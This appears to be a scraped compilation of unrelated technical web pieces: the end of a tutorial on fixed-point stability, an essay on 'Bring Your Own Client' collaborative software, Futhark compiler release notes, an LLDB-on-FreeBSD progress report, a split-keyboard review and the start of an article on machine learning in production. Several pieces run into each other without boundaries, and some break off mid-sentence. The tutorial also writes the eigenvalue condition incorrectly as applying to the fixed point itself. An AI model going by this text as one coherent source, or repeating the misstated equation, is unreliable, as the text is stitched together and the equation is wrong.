href="https://en.wikipedia.org/wiki/Eigenvalues_and_eigenvectors"><strong>eigenvalues</strong></a> and interpret the results of the fixed point.</p><p>Therefore, we find the eigenvalues for equation $\eqref{eq:13}$,</p>\[\begin{align} \mathbf{f}^{\prime}(\mathbf{x_{eq}}) \mathbf{x_{eq}} = \lambda \mathbf{x_{eq}} \label{eq:13} \end{align}\]<p>Here, $\lambda$ denotes the eigenvalue of the system. The roots of $\eqref{eq:13}$ are the eigenvalues the dynamical system at the fixed point $\mathbf{x}=\mathbf{x_{eq}}$.</p><h3 id="eigenvalue-interpretation-">Eigenvalue interpretation <a name="eigen_value_interpretation"></a></h3><p>For a continuous-time nonlinear dynamical system given by $\eqref{eq:3}$, the eigenvalues $\lambda$ that are found as roots of equation $\eqref{eq:13}$ can be interpreted as:</p><ul><li>If any of the eigenvalues have a real part $Re(\lambda)&gt;0$: $\mathbf{x_{eq}}$ is an unstable fixed point.</li><li>If all $Re(\lambda)&lt;0$: $\mathbf{x_{eq}}$ is a stable fixed point.</li><li>If $\lambda=0$: $\mathbf{x_{eq}}$ is a neutral fixed point.</li><li>If eigenvalues $\lambda$ are complex conjugates, i.e., $Im(\lambda) \ne 0$: The dynamical system has oscillatory behavior around the fixed point.</li></ul><h3 id="important-points-to-note-regarding-this-article">Important points to note regarding this article</h3><p>In this post, we discussed a general case of interpreting the fixed points of a dynamical system. By general, I mean $\mathbf{f(x)}$ is a non-linear, continuous-time vector-valued function representing a dynamical system. Below are certain points one should note about any non-linear dynamical system:</p><ul><li>We assumed that the system is non-linear and linearized it using Taylor series expansion near its fixed point (a.k.a. equilibrium).</li><li>We evaluated the stability of a fixed point <strong>near</strong> the equilibrium condition by perturbing the system ($\mathbf{x_{eq}}+\mathbf{\delta x}$).</li><li>This approach of interpreting the stability of the system by linearizing it near the equilibrium <strong>does not tell much</strong> about a system’s asymptotic behavior at large.<ul><li>We only understand how the system behaves <strong>locally</strong> or <strong>in the neighborhood of the fixed points</strong>.</li></ul></li><li>In practical or real-world systems, it may not be possible to interpret the global stability characteristics of the system. Thus, the stability analysis around the neighborhood of the fixed point is useful for many practical applications such as sustaining a non-linear system’s state near or at the fixed point.</li><li>In general, global asymptotic behaviors of any non-linear dynamical system can be complex and there are no systematic methods to predict and analyze such behaviors.</li></ul><h3 id="references-and-further-readings">References and Further Readings:</h3><ul><li>Deshpande, A.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Just a little note about the main problem I'm pondering these days...</p><div><p>It’s delightful to have the freedom to <strong>Bring Your Own Client (BYOC)</strong>: to choose your favorite application to interact with some data.</p>

<p>For example, I can program with Sublime Text, while my teammate uses vim, and we don’t need to fight to the death to pick one editor between us. There are dozens of text editors to choose from, and no lock-in from proprietary file formats.</p>

<p>Contrast this with Google Docs: in order to live collaborate with each other, we all need to use the same editor. For someone who spends their whole working day in Google Docs, this can be a serious limitation. I personally hate doing substantial writing in Google Docs.</p>

<p>In cloud apps, the live collaboration logic is usually coupled to a specific editor; even if Google wanted to expose an API for editing Google Docs in third-party editors, it would probably be very challenging. The situation is nicer with text editors and git, because editing is decoupled from collaboration logic. Our team only needs to agree on a version control solution, which exposes a simple API (local text files) that many editors can interact with.</p>

<p>To be fair, local vs cloud isn’t the only factor here—even in local software, collaborators are often forced to converge on a single proprietary client (Microsoft Office, Adobe suite); conversely, a cloud service can support a third-party client ecosystem with the right APIs and attitude. Still, cloud apps exacerbate the problem. With local files, there’s some default openness built in; even proprietary file formats can be reverse-engineered. With cloud apps, the default is a single official client, unless the service actively exposes an API (and doesn’t shut it down—looking at you, Twitter).</p>

<p>It seems like local-first software is a good foundation for promoting Bring Your Own Client more broadly. What would it look like to have a thriving ecosystem of third-party clients for Google Docs style word processing, which can all interoperate with each other, even supporting realtime collaboration?</p>

<h2 id="concrete-examples">Concrete examples</h2>

<p>Some successful existing examples of client ecosystems built around open standards:</p>

<ul>
<li>text editors / IDE</li>
<li>RSS readers</li>
<li>email clients</li>
<li>web browsers</li>
</ul>

<p>Places where I want to have BYOC:</p>

<ul>
<li>Google Docs. I wish I could write this very doc in my preferred editor, locally, but have also support for inline comments and live collaboration. Might it be possible to build a VSCode extension that edits Google Docs live? (Tricky, because Google doesn’t have a nice API to integrate with, but maybe doable)</li>
<li>Google Slides</li>
<li>Figma</li>
<li>Notion</li>
<li>Trello / Asana / shared todo lists</li>
<li>multiplayer code editor: live collaboration as in repl.it</li>
</ul>

<h2 id="finer-granularity">Finer granularity</h2>

<p>Today we generally think about BYOC at the “app” level. But can we go finer-grained than that, picking individual interface elements?</p>

<p>Instead of needing to pick a single email client, can I compose my favorite email client out of an inbox, a compose window, and a spam filter?</p>

<h2 id="problems-questions">Problems / questions</h2>

<ul>
<li><strong>Schema compatibility</strong>: do all the editors need to agree on a single rigidly specified format? If there are reconcilable differences between formats, can we build “live converters” that convert between them on every change? (Essentially, imagine collaborating between Pages and Microsoft Word, running a file export in both directions on every keystroke from either app) This problem is closely related to the problem of schema versioning within a single editor, but BYOC can complicate things much further.</li>
<li><strong>Preserving intent</strong>: the decoupling of git + text editors has a downside: the text format fails to capture the intent of edits, so git can’t be very smart about merging conflicts. Is this something fundamental to decoupling editors from collaboration? Or are there ways to design APIs that preserve intent better, while also supporting an open client ecosystem? (It seems like deciding on how you store your data in a CRDT is the key question here?)</li>
<li><strong>Additional editor-specific metadata</strong>: Some editors need to store additional data that isn’t part of the “core data model.” Eg, Sublime Text stores my <code>.sublime-workspace</code> file alongside the code source. How does this work smoothly without polluting the data being used by other editors?</li>
<li><strong>Code distribution</strong>: Traditionally code distribution happens through centralized means, but could code be distributed in a decentralized way alongside documents? If we’re collaborating together in a doc, can I directly share a little editor widget/tool that I’m using, without needing to send you a Github link? This might be overcomplicating things / orthogonal to the general idea here… (This idea inspired by <a href="https://webstrates.net/">Webstrates</a>, linked below)</li>
<li><strong>Innovation</strong>: Unfortunately stable open formats can limit product innovation—eg, email clients are tied down by adherence to the email standard. Can we mitigate that effect? I think web browsers have struck a good balance between progress and openness, despite frustrations in both directions.</li>
</ul>

<h2 id="addendum-faq">Addendum: FAQ</h2>

<p><em>Edited 2020-03-05: This post unexpectedly got popular on HN. As I drink my morning coffee, I’ll briefly respond to a few themes from the comments here.</em></p>

<p><strong>Q: Don’t standards make it harder to innovate?</strong></p>

<p>A: Yes, that’s a major challenge. For example, email and IRC have lagged behind Slack and Reddit, because it’s hard to change standards. We discussed this problem a bit in the <a href="https://www.inkandswitch.com/cambria.html#mastodon-protocol-evolution">Cambria paper, re: Mastodon</a>.</p>

<p>I think the key is to aim for more flexible and extensible standards: a useful 80% compatibility, rather than a perfect 100%.</p>

<p>Of course, once you abandon an exact standard, it’s easy to rack up tons of complexity. (I think the Semantic Web struggled with this problem trying to provide schema flexibility.) So we also need better tools to make partial compatibility easy to reason about, for both developers and users.</p>

<p><strong>Q: Hmm. 80% compatibility sounds like kind of a buggy mess? Word and OpenOffice don’t interop very well.</strong></p>

<p>A: I think with the right foundational tech for helping devs build maximally compatible formats, we can avoid the worst problems of incorrect format conversions. In the Cambria paper we sketched <a href="https://www.inkandswitch.com/cambria.html#lenses-in-action">a few examples</a> of partial compatibility, where Cambria guaranteed type safety and helped us easily avoid bugs.</p>

<p>That does leave a substantial design problem, though: even if everything works correctly, what do you show the <em>user</em> when two pieces of software aren’t fully compatible? How do you tell a user that their actions might show up differently for collaborators using different apps? I’m thinking a lot about these questions…</p>

<p><strong>Q: Cloud business models are so entrenched. Can this actually happen without government intervention?</strong></p>

<p>A:  It’s true that business incentives are a major challenge. Maybe some form of government intervention could help, but ultimately it’ll be fighting a headwind unless users and devs are excited for the change.</p>

<p>I think the most sustainable way to make progress is to make BYOC the most convenient option, for the typical user and the typical developer. On the desktop, it’s convenient for a developer to work with the user’s existing filesystem. On the web today, there’s no user-controlled filesystem, so it’s usually easiest to just put the data in a database, and add a ticket to the backlog for someday building a public-facing API. How would that change if we had a convenient user-controlled place to put data?</p>

<p>See the <a href="https://www.inkandswitch.com/local-first.html">local-first software</a> article by Ink &amp; Switch for some ideas on how new data architectures can make the right thing the easy thing, for both users and devs.</p>

<h2 id="prior-art">Prior Art</h2>

<ul>
<li><a href="https://webstrates.net/">Webstrates</a> has some great demos of this philosophy. It uses a centralized server for the live sync.</li>
<li>Webstrates descends from Michel Beaudouin-Lafon’s work on <a href="https://youtu.be/ntaudUum06E?t=727">instrumental interfaces</a>—"polymorphic" tools that can operate in different applications. For example, a color picker that I can use in any app.</li>
<li>The <a href="https://solidproject.org/">SOLID</a> decentralized web project has some closely related ideas: <a href="https://ruben.verborgh.org/blog/2017/12/20/paradigm-shifts-for-the-decentralized-web/#apps-become-views">“apps become views”</a>, creating a competitive marketplace of clients decoupled from data silos. In turn it’s heavily inspired by ideas from the Semantic Web.</li>
<li><a href="https://mashable.com/2009/05/28/google-wave-guide/">Google Wave</a> had some related ideas… A platform for realtime collaboration, with a rich open <a href="https://youtu.be/v_UyVmITiYQ?t=4207">extension API</a> intended for people to build various collaboration clients on top of. Seems like the common wisdom on why it failed is that it was <a href="https://gizmodo.com/what-in-the-hell-was-google-wave-trying-to-be-anyway-1835038967">too complicated</a> and tried to do too much.</li>
<li><a href="https://braid.news/">Braid</a> is exploring ways to extend HTTP to support collaborative editing across diverse clients.</li>
</ul>



<ul>
<li>I believe one piece of the puzzle here is declarative schema mapping, for example the <a href="https://www.inkandswitch.com/cambria.html">Cambria</a> project I worked on recently.</li>
<li>Granular BYOC starts to look like <a href="https://www.geoffreylitt.com/2020/07/19/tools-over-apps-for-personal-notetaking.html">software as curation</a>: assembling software out of smaller “extensions”</li>
<li>Also relates to document-centric computing ideas like OpenDoc. Some <a href="https://twitter.com/geoffreylitt/status/1362779218241855494">recent notes</a> I took on why that failed…</li>
<li>Part of the solution may involve extracting and synchronizing data from cloud services without going through official APIs, as demonstrated in my <a href="https://www.geoffreylitt.com/wildcard">Wildcard</a> project.</li>
</ul>

<h2 id="im-working-on-this">I’m working on this!</h2>

<p>I’m currently pursuing a PhD at MIT doing research on this topic. Lots of challenges and open questions ahead, but I have some ideas for how to make progress. I’m particularly excited about clever ways to incrementally nudge us from the status quo to a BYOC world, rather than reinventing everything.</p>

<p>I actually wrote this note 10 months ago and had totally forgotten about it.</p>

<p>An hour ago, I randomly came across it and was quite amused. It includes some ideas which I <em>thought</em> I had started thinking about only recently. But it turns out they’ve been incubating in my mind for a long time. Funny how that works!</p>

<p>
    Posted on March  4, 2021
    
</p>

<p>We made another one (<a href="https://github.com/diku-dk/futhark/releases/tag/v0.19.1">full changelog here</a>). This is a major release, which means that we broke compatibility. So what happened? Did we <a href="https://futhark-lang.org/blog/2020-10-08-futhark-0.18.1-released.html">change type of a fundamental constructs</a> or <a href="https://futhark-lang.org/blog/2020-03-15-futhark-0.15.1-released.html">add a ton of novel type rules</a>? Sort of: the <code>negate</code> function that we deprecated in 0.18.6 is now gone, and you must use <code>neg</code> instead, thus <a href="https://futhark-lang.org/blog/2021-01-11-no-regrets.html#short-names">addressing another regret</a>.</p>
<p>Since I don’t think that this <s>change</s> <em>improvement</em> by itself is going to be the killer feature that pushes Futhark into the mainstream, I’ll also mention some of the things we added since the last release announcement.</p>
<p>One improvement that actually landed in 0.18.4, but which I never got around to writing about at the time, is that our CUDA backend now uses a much more efficient implementation of <code>scan</code>, based on a clever <a href="https://research.nvidia.com/publication/single-pass-parallel-prefix-scan-decoupled-look-back">single-pass technique</a>. This is really an abuse of the GPU programming model, but NVIDIA promises that it’s fine - and they use the same technique in <a href="https://github.com/NVIDIA/cub">CUB</a>. With this implementation, <code>scan</code> is almost as fast as <code>map</code>, and since <code>scan</code> is such a <a href="https://www.cs.cmu.edu/~guyb/papers/Ble93.pdf">crucial building block for many parallel algorithms</a>, this has significant impact by making e.g.&nbsp;radix sorting and filtering much faster. I only wish I knew of a similar technique for AMD GPUs. The work was done by Andreas Nicolaisen and Marco Aslak Persson for <a href="https://futhark-lang.org/student-projects/marco-andreas-scan.pdf">their master’s thesis</a> at <a href="https://diku.dk/">DIKU</a>.</p>
<p>Another significant improvement is automatic register tiling of certain classes of nested parallel loops. <a href="https://en.wikipedia.org/wiki/Loop_nest_optimization">Loop tiling</a> is a family of locality optimisations, which can be quite important for memory-bound code. The Futhark compiler has supported a fairly general block tiling optimisation for years, but register tiling can improve performance on e.g.&nbsp;matrix multiplication by at least another factor of two. Tiling is very sensitive to choice of tile sizes, and the compiler is not yet very good at automatically picking good default sizes, so some manual tweaking of tuning options is needed to obtain the best performance. We hope to address that soon - it shouldn’t be very difficult. This improvement was <em>also</em> done by students, namely Anders Holst and Æmilie Bom Cholewa-Madsen, for their bachelor’s thesis.</p>
<p>The final improvement I will write about is perhaps somewhat obscure, but it touches on interesting aspects of language design. For a long time, Futhark has contained a facility for doing parallel scatter operations, exposed to the user as the function <code>scatter</code> of the following type:</p>
<div id="cb1"><pre><code><span id="cb1-1"><span>val</span> scatter 't [m] [n] : (dest: *[m]t) -&gt; (is: [n]i64) -&gt; (vs: [n]t) -&gt; *[m]t</span></code></pre></div>
<p>Given an array <code>dest</code> and two arrays <code>is</code> and <code>vs</code> of indexes and values respectively, <code>scatter dest is vs</code> returns <code>dest</code> but with the elements at the positions given by <code>is</code> replaced by the corresponding values in <code>vs</code>. This is a useful building block, but limited in that we can only update points in a one-dimensional array. If we wish to scatter into a two-dimensional array, we must first <code>flatten</code> it, manually compute the corresponding flat indexes, perform the <code>scatter</code>, and then <code>unflatten</code> it back to its original shape. This is clumsy. Worse: it confuses the compiler and inhibits optimisation.</p>
<p>So, why is <code>scatter</code> not polymorphic in the <code>dest</code> array? Because to the type checker, <code>scatter</code> is just another function, and the type system is not strong enough to express an property such as “the <code>is</code> array contains <code>p</code>-ary tuples, where <code>p</code> is the rank of <code>dest</code>”. All functions, even those that map directly to compiler intrinsics, <em>must</em> be expressible in the type system. As a workaround, our PhD student <a href="https://munksgaard.me/">Philip Munksgaard</a> added functions <code>scatter_2d</code> and <code>scatter_3d</code> that support 2D and 3D arrays, respectively. This is a pragmatic solution, but it is not beautiful (and what about 4D arrays?).</p>
<p>The great irony is that this problem does not exist in the core language we use inside the compiler. In the core language, <code>scatter</code> (and all other intrinsics) are not functions, but rather special language constructs with their own ad-hoc rules and semantics. We can get away with a lot more in the core language, because it does not have to support type inference or polymorphism. Can we do the same thing in the source language? Possibly! Even in the source language, language constructs that have their own syntax can also have their own ad-hoc rules for type checking and inference. Adding lots of special syntax to a language is not good design, but since <code>scatter</code> is <a href="https://futhark-lang.org/blog/2019-04-10-what-is-the-minimal-basis-for-futhark.html">part of the minimal basis</a>, it may deserve it.</p>
<p>Futhark already has a notation for array updates: <code>a with [i] = v</code>, which returns <code>a</code> with the value at index <code>i</code> replaced by <code>v</code>. If we allow <code>i</code> to be an array, then we have a decent notation for <code>scatter</code> (we must also require that <code>v</code> is an array of the same size as <code>i</code>). It is straightforward to use the existing notation for multidimensional updates <code>a with [i,j] = v</code> to then support arbitrary-dimensional scattering.</p>
<p>Type inference such an extended construct is somewhat challenging, and I have yet to make up my mind on whether to require special syntax for the <code>scatter</code> case. If not, the expression <code>a with [i] = v</code> will, in the absence of any other information, give rise to the somewhat convoluted type checking constraint "<code>i</code> must have type <code>i64</code> <em>or</em> <code>[n]i64</code> for some <code>n</code>, and in that case <code>v</code> must also be an array of size <code>n</code>. I long ago decided quality of type errors was more important than minimising the number type annotations, but we’ll see whether we can make it work.</p>
<p>One unsolved problem is <code>scatter</code>s cousin, <code>reduce_by_index</code> (also known as <a href="https://futhark-lang.org/blog/2018-09-21-futhark-0.7.1-released.html#histogram-computations">generalised histogram</a>), which similarly suffers from being limited to a single dimension. However, I have not been able to come up with a good syntax that would allow us to promote it to the level of a language construct.</p>

<p>Moritz Systems have been contracted by the <a href="https://freebsdfoundation.org/">FreeBSD Foundation
</a> to continue our work on modernizing
the <a href="https://lldb.llvm.org/">LLDB</a> debugger’s support for <a href="https://www.freebsd.org/">FreeBSD</a>.</p>
<p>The complete Project Schedule is divided into four milestones, each
taking approximately one month:</p>
<ul>
<li>M1 Switch all the non-x86 CPUs to the LLDB FreeBSD
Remote-Process-Plugin.</li>
<li><strong>M2 Iteration over regression tests on ARM64 and fixing known bugs,
marking the non-trivial ones for future work.  Remove the old
local-only Process-Plugin.</strong></li>
<li>M3 Implement follow-fork and follow-vfork operations on par with
the GNU GDB support.  Cover the functionality with LLDB regression
tests.</li>
<li>M4 Implement SaveCore functionality for FreeBSD and enhance
the regression testing of core files in LLDB.  Update the FreeBSD
manual.</li>
</ul>
<p>During the past month we’ve successfully removed the legacy FreeBSD
plugin and continued improving the new one.  We have prepared
an implementation of hardware breakpoint and watchpoint support
for FreeBSD/AArch64, and iterated over all tests that currently fail
on that platform.  Therefore, we have concluded the second milestone.</p>
<h2 id="building-freebsd-for-different-abis">Building FreeBSD for different ABIs</h2>
<h3 id="architectures-with-multiple-abis">Architectures with multiple ABIs</h3>
<p>In the <a href="https://www.moritz.systems/blog/freebsd-remote-process-plugin-on-non-x86-architectures/">previous report</a>,
we have shortly explained how to perform a cross-build of FreeBSD
and LLVM for a different architecture, using AArch64 as an example.
We would like to expand that a bit to give specific examples for other
architectures we’ve been working on, and to cover different ABIs
on the architectures that have more than one.</p>
<p>An Operating System Application Binary Interface (ABI) defines
the interface between compiled applications, libraries and the Operating
System.  It covers a wide range of aspects necessary for interoperability,
for example the executable format, usage rules for registers, the method
of passing parameters and return values.</p>
<p>The program and all its dependent libraries must use the same ABI
to work correctly, and the Operating System’s kernel must support
the same ABI.  ABI is generally defined per platform, though for some
platforms multiple ABIs existed.  For example, the FreeBSD/ARM port has
historically used OABI, then <a href="https://lists.freebsd.org/pipermail/freebsd-arm/2013-July/006053.html">switched to EABI</a>.</p>
<p>The existence of multiple parallel ABIs for the same platform is often
dictated by two factors: <em>endianness</em> and <em>presence of hardware
Floating-Point Unit (FPU)</em>.</p>
<p><img src="https://raw.githubusercontent.com/Moritz-Systems/moritz_staticDir/master/endian.svg" alt="Endian"></p>
<p>Endianness specifies the order in which bytes of a word (e.g.
an integer) are stored.  On Big Endian systems, the most significant
byte (i.e. the one with the highest weight) are stored first, similarly
to how humans type numbers starting with the most significant digits.
On Little Endian systems, the opposite happens — the least significant
byte is written first, and the most significant last.  Other kinds
of endianness do exist but they are of little significance.</p>
<p>Many modern architectures are <em>bi-endian</em> — that is, can either run
in Big Endian or Little Endian mode.  Today Little Endian is more
popular, primarily because this is the mode used in the x86
architecture.  It is also frequently chosen for bi-endian architectures
to avoid compatibility problems with buggy software.</p>
<p>Interoperability between computer systems using different endianness
requires conversion to a common variant.  The base TCP/IP protocols
use Big Endian encoding for integers.  Many other protocols,
particularly originating from x86 world, use Little Endian.  Some data
formats support both variants, for example the UFS filesystem can be
either made Little Endian or Big Endian to optimize for the host
platform.  Similarly, the wide-character Unicode encoding UTF-16, UCS-2
and UCS-4 exist in both Little Endian and Big Endian variants, and are
often preceded by a Byte-Order Mark that can be used to recognize
the encoding.</p>
<p>Processors with optional FPUs often support <em>softfloat</em> and <em>hardfloat</em>
ABIs.  The hardfloat ABI assumes that the FPU is present and floating-point
parameters can be passed via the dedicated FPU registers.  On the other
hand, the softfloat ABI assumes that all floating-point operations must
be emulated in software, and therefore floating-point parameters need
to be passed elsewhere.  Technically, it is also possible to use hardware
FPU for arithmetic while using softfloat ABI for argument passing,
with a little overhead necessary to move arguments from/to FPU
registers.</p>
<div><pre><code data-lang="nasm"><span>; double add(double a, double b) {</span>
<span>;   return a + b;</span>
<span>; }</span>

<span>; hardfloat version (gnueabihf)</span>
<span>; in: d0, d1</span>
<span>; out: d0</span>
add_hardfp:
  <span>vadd.f64</span>  d0, d0, d1
  <span>bx</span>        lr

<span>; hardfloat version with softfloat ABI (gnueabi)</span>
<span>; in: {r0, r1}, {r2, r3}</span>
<span>; out: {r0, r1}</span>
add_softfp:
  <span>vmov</span>      d0, r0, r1
  <span>vmov</span>      d1, r2, r3
  <span>vadd.f64</span>  d0, d0, d1
  <span>vmov</span>      r0, r1, d0
  <span>bx</span>        lr

<span>; softfloat version (-mfloat-abi=soft)</span>
add_soft:
  <span>push</span>      <span>{</span>r11, lr<span>}</span>
  <span>bl</span>        __aeabi_dadd
  <span>pop</span>       <span>{</span>r11, pc<span>}</span></code></pre></div>
<p>The above snippet demonstrates a trivial function that adds two double
precision numbers and returns the result.  In hardfloat ABI,
the parameters are passed in dedicated 64-bit registers <em>d0</em> and <em>d1</em>,
and the result is returned in <em>d0</em>.  In softfloat ABI, the doubles
are split into 32-bit registers <em>r0</em> and <em>r1</em>, and <em>r2</em> and <em>r3</em>
appropriately.  The result is returned in the first pair.  This implies
that when using the softfloat ABI with FPU, the data needs to be moved
between General-Purpose Registers and FPU Registers.  Finally,
the softfloat version invokes a compiler runtime double-adding function
that performs the operation in software.</p>

<h2 id="hardware-breakpoints-and-watchpoints-on-aarch64">Hardware Breakpoints and Watchpoints on AArch64</h2>
<h3 id="breakpoints-and-watchpoints-hardware-and-software">Breakpoints and Watchpoints, Hardware and Software</h3>
<p><em>Breakpoints</em> and <em>watchpoints</em> belong to a category of contraptions
collectively called <em>traps</em>.  A trap interrupts the program execution
whenever a specific condition occurs.  When the program is running
under a debugger, the trap generally causes the control to be returned
to the debugger.</p>
<p>Breakpoints are traps that are triggered when a specific code location
is being executed.  Watchpoints are triggered when a specific memory
location (e.g. a variable) is being accessed.  Both these kinds of traps
can be implemented in hardware or emulated in software.  Hardware
implementations are generally more performant, as processor itself
is checking for the monitored condition.  However, they usually have
limitations, most notably in the number of hardware traps available.
Whenever using a hardware implementation is not feasible, the debugger
can emulate breakpoints and watchpoints in software.</p>
<p>Software breakpoints are easy to implement and have relatively small
performance impact.  The common method of implementing them is to
overwrite the memory at monitored location with a code explicitly
triggering the debugger (e.g. an <code>int3</code> instruction on x86).  When
the process executes this code, the control is returned to the debugger
as if a hardware breakpoint was triggered.  When the debugger is about
to resume the program, it temporarily restores the original code,
single-steps through it and then reintroduces the software trap before
actually resuming the execution.  One particular limitation of this
implementation is that it can only be used on writable memory — i.e.
they cannot be used to debug code present on ROM.</p>
<p>Software watchpoints are harder.  LLDB does not implement them at all.
GDB implements them partially by single-stepping through the program
and explicitly checking whether the variable’s value changed.
Naturally, this implied that it is impossible to monitor for variable
reads or even writing the same value.  A more versatile implementation
would require actually analyzing the operands of instructions executed
and therefore would probably be best done via an emulator.</p>
<h3 id="hardware-breakpoints-and-watchpoints-on-x86-and-arm">Hardware Breakpoints and Watchpoints on x86 and ARM</h3>
<p>Both x86 and ARM architectures implement hardware breakpoints
and watchpoints.  However, their respective implementations
and the exposed programmer’s interfaces are different enough to justify
a comparison.</p>
<p><img src="https://raw.githubusercontent.com/Moritz-Systems/moritz_staticDir/master/dbregs.svg" alt="Debug Registers"></p>
<p>The x86 architecture provides a fixed number of 4 traps, and each
of them can be used either as a breakpoint or a watchpoint.  This
implies that every breakpoint set reduces the number of available
watchpoints, and vice versa.  On the other hand, ARM has breakpoints
and watchpoints entirely separate.  The architecture permits
the processor to provide between 2 and 16 breakpoints and watchpoints
each.</p>
<p>x86 uses 6 debug registers (there are 8 on i386 and 16 on amd64 in total
but others are reserved).  The registers DR0 through DR3 are used to set
the addresses for the four available traps, DR6 is used as a status
register, while DR7 is used as a control register for all of them.</p>
<p>ARM provides a pair of debug registers — a value (i.e. address register)
and a control register — for every breakpoint and watchpoint.
On AArch64, the DBGBCR<em>i</em>_EL1 and DBGBVR<em>i</em>_EL1 registers are
respectively breakpoint control registers and value registers, while
DBGWCR<em>i</em>_EL1 and DBGWVR<em>i</em>_EL1 are respectively watchpoint control
and value registers (on AArch32, the corresponding registers do not
have the _EL1 suffix).  Additionally, the ID_AA64DFR0_EL1 register
provides the number of available breakpoints and watchpoints.</p>
<p>x86 allows breakpoints and watchpoints to be set on arbitrary memory
locations, with watchpoints monitoring 1, 2, 4 or 8 bytes starting
at that location (8 bytes available only on 64-bit processors).  ARM
requires …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    
    <div>
      <p>In December of 2018 I finally received my UHK after months of waiting.</p>

<p>After using it daily since, I’m 100% convinced that the UHK is worth the asking price, probably more, and I’m happy that I got it at an early adopter discount.</p>

<p>Currently at $275 USD it’s definitely priced like the split ergonomic keyboard that it is, but what I think makes this one worth that is the open source, hackable nature of the keyboard.</p>

<p>Here’s my thoughts after using it as my daily driver for many months,</p>



<p>At first, I wasn’t a complete believer in Kailh keyswitches, but they’ve held up very well and show no signs of losing their feel. Still prefer Cherry for the desktop fullsize keyboards at home, but on the go and around school I’ve still had a good experience with these switches.</p>

<p>For some reason, they offered Cherry Clear and Cherry Green, no other Browns besides Kailh. Since I was planning on using this board to take notes in class, low noise was a high priority.</p>

<p>After a month or two, the switches were still a bit loud to use for notes in quiet lectures, so I bought and installed some generic o-rings which helped to reduce the keycap to board noise, but the springback action was still tell-tale sound of a mechanical keyboard.</p>

<p>Overall the feel of of the keyboard has been excellent and there’s been no hunting for keys as everything is exactly where I expect it to be.</p>



<p>The #1 eye-catching feature is for sure the splitting action.</p>

<p>I pull it out of a carrying case in one piece, and it looks whole, then it “appears I just rip my keyboard in half” as one fellow student commented.</p>

<p>But the aesthetics of the keyboard are nothing compared to how much better my carpal tunnel syndrome improved since using the UHK in place of my laptop keyboard. In fact, the primary reason I bought the UHK was to deal with carpal tunnel and I’m impressed how I’ve recovered without losing any real productivity.</p>

<p>I suspect the largest contributing factor to my development of CT was the usage of the trackpad on my laptop. Having to twist my hand and finger to move from keyboard use to having my thumb at the nearest edge of the laptop for pressing mouse buttons was likely the repetitive strain that triggered it.</p>

<p>While split, I never need to move my wrists, instead, I move the keyboard so that it’s exactly where my hands want to rest naturally. Problem solved.</p>



<p><img src="https://unhexium.net/images/uhk/desk1cut.jpg" alt=""></p>

<p>While splitting is certainly the most eye-catching features of the UHK, the LED display and steel plate construction also make it look (and feel) very premium.</p>

<p>You can of course order different colors of cases, mine being red, but the option exists such that I could easily grab a second case and customize it with paint or other mods.</p>

<p>In the future I will likely switch out the cable and keycaps to suit whatever design preferences I might have accumulated then.</p>



<p>In the first month of usage I had to change the ordering of the bottom modifier keys in order to reduce the reach strain from my most common shortcuts, I currently have them laid out as:</p>

<div><div><pre><code>Ctrl Super Fn Alt Mod || Space Super Alt Fn Ctrl
</code></pre></div></div>

<p>The goal here was to keep Super close to the right thumb and Alt close to the left thumb, because <code>Super-</code> is my window management base on Pop_OS! and Alt is used for switching terminal panes (where the right hand applies arrow keys I/HJKL) and managing textual multi-cursor.</p>

<p>It was super easy to just pop the keys off, rearrange, and reconfigure in UHK Agent.</p>

<p>I doubt I’m in the majority here, but when I touch type I used to hit the <code>Y</code> key with my left hand, since the UHK though it’s forced me to fix that habit and use the closer hand.</p>



<p>Currently my biggest gripe out of the whole experience is the mini USB connector method.</p>

<p>The connector itself is better than micro USB, but the placement of the connector underneath the top flange should have a better method of securing it instead of a simple cable pinch hole. The cable almost never stays stuck in the hole and often just causes more stress as a bend point.</p>

<p>I would love a switch to type-C with a latch mechanism, or even just keeping the connector outward facing like the RJ11 bridge would be fine.</p>

<p>After the connector, my only other problem is that the bridge cable gets squished whenever I place the keyboard inside a sleeve. I can’t immediately come up with a solution for this, since the extra slack in the already curled cable is definitely needed, but you should note to buy a case with a little more room vertically if you don’t want a squished looking bridge cable.</p>

<p><em>Machine learning has emerged as a must-have tool for any serious data team: augmenting processes, generating smarter and more accurate predictions, and generally improving our ability to make use of data.</em></p>



<p><em>However, discussing applications of ML in theory is much different than actually applying ML models at scale in production. In this article, we walk through common challenges and corresponding solutions to making ML a force multiplier for your data organization.&nbsp;</em></p>



<p>From generating your weekend bike route on Google Maps to helping you discover your next binge-worthy show on Netflix, machine learning (ML) has evolved well beyond a theoretical buzzword into a powerful technology that most of us use every day.&nbsp;</p>



<p>For the modern business, the appetite for ML has never been stronger. But while certain industries have been transformed by the automation made possible by ML—think <a href="https://www.businessinsider.com/ai-in-banking-report" target="_blank" rel="noopener">fraud detection</a> in finance and <a href="https://customerthink.com/explained-working-and-advantages-of-a-recommendation-engine/" target="_blank" rel="noopener">personalized product recommendations</a> in e-commerce—the hard truth is that many ML projects fail before they ever see the light of day.&nbsp;</p>



<p>In October 2020, <a href="https://www.gartner.com/en/newsroom/press-releases/2020-10-19-gartner-identifies-the-top-strategic-technology-trends-for-2021#:~:text=Gartner%20research%20shows%20only%2053,a%20production%2Dgrade%20AI%20pipeline." target="_blank" rel="noopener">Gartner reported</a> that only 53% of projects make it from prototype to production—and that’s at organizations with some level of AI experience. For companies still working to develop a data-driven culture, that number is likely far higher, with <a href="https://venturebeat.com/2019/07/19/why-do-87-of-data-science-projects-never-make-it-into-production/" target="_blank" rel="noopener">some failure-rate estimates</a> soaring to nearly 90%.&nbsp;</p>



<p>Data-first tech companies like Google, Facebook, and Amazon are transforming our daily lives with ML, while many other well-funded and highly talented teams are still struggling to get their initiatives off the ground. But why does this happen? And how can we fix it?</p>



<p><strong>We share the four biggest challenges modern data teams face when adopting ML at scale— and how to overcome them.&nbsp;</strong></p>



<h3>Misalignment between actual business needs and ML objectives</h3>



